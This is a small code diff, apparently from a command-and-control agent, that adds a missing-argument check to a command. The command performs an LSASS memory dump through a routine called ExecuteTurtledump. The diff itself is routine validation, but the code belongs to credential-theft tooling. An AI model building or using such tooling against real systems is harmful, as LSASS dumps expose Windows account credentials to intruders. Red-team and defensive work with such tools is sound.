@@ -16,6 +16,10 @@ namespace Agent.Commands
 
         public override string Execute(AgentTask task)
         {
+            if (task.Args is null || task.Args.Length == 0)
+            {
+                return "No Output path provided";
+            }
             var dumpPath = task.Args[0];
             if (!ExecuteTurtledump(dumpPath))
                 return "Failed to perform lsass dump";
